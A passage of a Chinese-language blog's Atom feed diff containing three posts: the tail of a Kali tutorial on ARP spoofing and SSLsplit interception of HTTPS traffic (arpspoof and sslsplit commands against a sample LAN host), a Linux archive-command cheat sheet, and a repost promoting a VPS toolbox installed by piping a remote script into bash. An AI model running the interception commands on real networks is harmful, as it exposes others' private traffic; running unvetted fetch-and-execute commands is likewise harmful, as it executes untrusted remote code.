id="3、使用该命令显示所有刚才配置的规则："><a href="#3、使用该命令显示所有刚才配置的规则：" class="headerlink" title="3、使用该命令显示所有刚才配置的规则："></a>3、使用该命令显示所有刚才配置的规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><h1 id="5、-Arp欺骗-，截获目标主机的网络流量"><a href="#5、-Arp欺骗-，截获目标主机的网络流量" class="headerlink" title="5、 Arp欺骗 ，截获目标主机的网络流量"></a>5、 Arp欺骗 ，截获目标主机的网络流量</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 目标IP -r 目标主机网关</span><br><span class="line">arpspoof -i eth0 -t 192.168.88.130 -r 192.168.88.2</span><br></pre></td></tr></table></figure><h1 id="6、启动SSLsplit进行攻击"><a href="#6、启动SSLsplit进行攻击" class="headerlink" title="6、启动SSLsplit进行攻击"></a>6、启动SSLsplit进行攻击</h1><h2 id="1、创建目录"><a href="#1、创建目录" class="headerlink" title="1、创建目录"></a>1、创建目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="built_in">test</span>/logdir</span><br></pre></td></tr></table></figure><h2 id="2、侦听设定的端口"><a href="#2、侦听设定的端口" class="headerlink" title="2、侦听设定的端口"></a>2、侦听设定的端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/test -S /root/test/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure><p>根目录下出现一个test文件夹 </p><p>伪造成功后，目标机访问https的网站，会出现“安全证书有问题的错误”，点击继续访问后，访问信息被记录在connect.log中，且在test&#x2F;logdir可查看传输数据</p>]]></content>
+    
+    
+    <summary type="html">sslsplit</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux常用解压与压缩命令</title>
+    <link href="https://macin.top/posts/8e8fbaa2/"/>
+    <id>https://macin.top/posts/8e8fbaa2/</id>
+    <published>2024-12-16T12:24:28.000Z</published>
+    <updated>2024-12-24T12:40:19.186Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="tar-文件"><a href="#tar-文件" class="headerlink" title=".tar 文件"></a>.tar 文件</h1><p>仅打包，并非压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf FileName.tar         <span class="comment"># 解包 </span></span><br><span class="line"></span><br><span class="line">tar -cvf FileName.tar DirName <span class="comment"># 将DirName和其下所有文件（夹）打包</span></span><br></pre></td></tr></table></figure><h1 id="gz文件"><a href="#gz文件" class="headerlink" title=".gz文件"></a>.gz文件</h1><p>.gz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gunzip FileName.gz  <span class="comment"># 解压1 </span></span><br><span class="line"></span><br><span class="line">gzip -d FileName.gz <span class="comment"># 解压2 </span></span><br><span class="line"></span><br><span class="line">gzip FileName       <span class="comment"># 压缩，只能压缩文件</span></span><br></pre></td></tr></table></figure><h1 id="tar-gz文件和-tgz文件"><a href="#tar-gz文件和-tgz文件" class="headerlink" title=".tar.gz文件和.tgz文件"></a>.tar.gz文件和.tgz文件</h1><p>.tar.gz 和 .tgz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf FileName.tar.gz               <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">tar -zcvf FileName.tar.gz DirName       <span class="comment"># 将DirName和其下所有文件（夹）压缩 </span></span><br><span class="line"></span><br><span class="line">tar -C DesDirName -zxvf FileName.tar.gz <span class="comment"># 解压到目标路径</span></span><br></pre></td></tr></table></figure><h1 id="zip文件"><a href="#zip文件" class="headerlink" title=".zip文件"></a>.zip文件</h1><p>感觉.zip占用空间比.tar.gz大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip FileName.zip          <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">zip FileName.zip DirName    <span class="comment"># 将DirName本身压缩 </span></span><br><span class="line"></span><br><span class="line">zip -r FileName.zip DirName <span class="comment"># 压缩，递归处理，将指定目录下的所有文件和子目录一并压缩</span></span><br></pre></td></tr></table></figure><h1 id="rar文件"><a href="#rar文件" class="headerlink" title=".rar文件"></a>.rar文件</h1><p>mac和linux并没有自带rar，需要去下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rar x FileName.rar      <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">rar a FileName.rar DirName <span class="comment"># 压缩 .tar是打包</span></span><br></pre></td></tr></table></figure><p>.tar.gz才是压缩过的文件，</p><p>.tar.gz常见于unix系统，</p><p>在ubuntu或macos可以直接解压，</p><p>而.zip常见于windows系统</p>]]></content>
+    
+    
+      
+      
+        
+        
+    <summary type="html">&lt;h1 id=&quot;tar-文件&quot;&gt;&lt;a href=&quot;#tar-文件&quot; class=&quot;headerlink&quot; title=&quot;.tar 文件&quot;&gt;&lt;/a&gt;.tar 文件&lt;/h1&gt;&lt;p&gt;仅打包，并非压缩&lt;/p&gt;
+&lt;figure class=&quot;highlight</summary>
+        
+      
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>科技lion脚本工具</title>
+    <link href="https://macin.top/posts/c073f5ea/"/>
+    <id>https://macin.top/posts/c073f5ea/</id>
+    <published>2024-12-16T12:02:26.000Z</published>
+    <updated>2024-12-24T12:40:19.192Z</updated>
+    
+    <content type="html"><![CDATA[<p>科技Lion的Shell脚本工具是一款全能脚本工具箱，使用shell脚本编写。专为Linux服务器监控、测试和管理而设计。无论您是初学者还是经验丰富的用户，该工具都能为您提供便捷的解决方案。集成了独创的Docker管理功能，让您轻松管理容器化应用；LNMP建站解决方案能帮助您快速搭建网站，站点优化，防御，备份还原迁移一应俱全；并且整合了各类系统工具面板的安装及使用，使系统维护变得更加简单。我们的目标是成为全网最优秀的VPS一键脚本工具，为用户提供高效、便捷的科技支持。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="安装基础组件"><a href="#安装基础组件" class="headerlink" title="安装基础组件"></a>安装基础组件</h3><p><strong>Debian&#x2F;Ubuntu</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update -y &amp;&amp; apt install -y curl</span><br></pre></td></tr></table></figure><p><strong>CentOS&#x2F;RedHat&#x2F;Fedora&#x2F;AlmaLinux&#x2F;Rocky Linux</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update &amp;&amp; yum install -y curl</span><br></pre></td></tr></table></figure><p><strong>Alpine Linux</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apk update &amp;&amp; apk add curl</span><br></pre></td></tr></table></figure><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sL kejilion.sh)</span><br></pre></td></tr></table></figure><h2 id="脚本主界面"><a href="#脚本主界面" class="headerlink" title="脚本主界面"></a><strong>脚本主界面</strong></h2><p>脚本全面支持Ubuntu、Debian，Cent OS和Alpine Linux系统</p><p>只要执行命令自动获取最新版本</p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><h4 id="docker管理器"><a href="#docker管理器" class="headerlink" title="docker管理器"></a><strong>docker管理器</strong></h4><p>轻松安装管理你的docker容器，无需安装任何可视化面板。操作优雅直觉！</p><h4 id="LDNMP建站"><a href="#LDNMP建站" class="headerlink" title="LDNMP建站"></a><strong>LDNMP建站</strong></h4><p>LDNMP建站系统，超凡的快速建站方案，多站共存都是一键搞定。站点管理防护优化一应俱全。</p><h4 id="面板工具集合"><a href="#面板工具集合" class="headerlink" title="面板工具集合"></a><strong>面板工具集合</strong></h4><p>集合了时下流行的VPS面板应用程序，一键快速搭建。安装完成即可使用。安装后动态管理已安装的面板应用。</p><h4 id="系统工具集合"><a href="#系统工具集合" class="headerlink" title="系统工具集合"></a><strong>系统工具集合</strong></h4><p>集合了对Linux各项系统管理等基础操作，方便小伙伴优雅使用。调整VPS参数不需要记住繁琐命令，一键搞定。</p><h4 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a><strong>更多功能</strong></h4><p>还有更多功能等待着大家自己发掘。欢迎提供宝贵意见，希望一键化脚本工具越来越强大。帮助小伙伴们使用VPS管理VPS。</p><p>转自<a href="https://blog.kejilion.pro/kejilion-sh/">科技lion一键脚本 Linux服务器运维工具箱 监控管理建站一个脚本全搞定！</a></p>]]></content>
+    
+    
+    <summary type="html">linux,os,debian,ubuntu,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+</feed>
